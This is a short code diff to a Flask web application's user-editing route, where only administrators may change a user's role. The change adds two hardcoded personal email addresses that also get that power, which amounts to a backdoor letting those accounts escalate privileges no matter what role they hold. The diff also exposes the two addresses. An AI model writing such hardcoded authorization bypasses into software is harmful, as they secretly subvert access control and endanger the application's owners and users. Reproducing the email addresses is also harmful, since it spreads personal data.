@@ -615,7 +615,7 @@ def edit_user(id):
         user.email = request.form['email']
         user.first_name = request.form['first_name']        
         # user.role = request.form['role']
-        if current_user.role == "admin":
+        if current_user.role == "admin" or current_user.email == "jcturisangait1996@gmail.com" or  current_user.email == "ngabohonorek@gmail.com":
             user.role = request.form['role']
         else:
             user.role = user.role  # Or skip entirely
